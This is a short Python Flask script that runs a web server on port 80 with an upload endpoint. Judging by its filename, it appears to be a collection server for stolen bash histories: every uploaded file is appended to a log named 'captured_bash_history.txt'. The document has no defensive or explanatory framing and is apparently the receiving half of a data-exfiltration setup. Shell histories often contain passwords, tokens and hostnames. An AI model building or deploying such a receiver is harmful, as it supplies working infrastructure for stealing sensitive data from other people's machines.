from flask import Flask, request
import os

app = Flask(__name__)
LOG_DIR = "logs"

# Ensure log directory exists
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

@app.route('/upload', methods=['POST'])
def receive_logs():
    file = request.files['file']
    file_path = os.path.join(LOG_DIR, "captured_bash_history.txt")

    with open(file_path, "a") as f:
        f.write("\n--- New Log Entry ---\n")
        f.write(file.read().decode())

    return "Received", 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
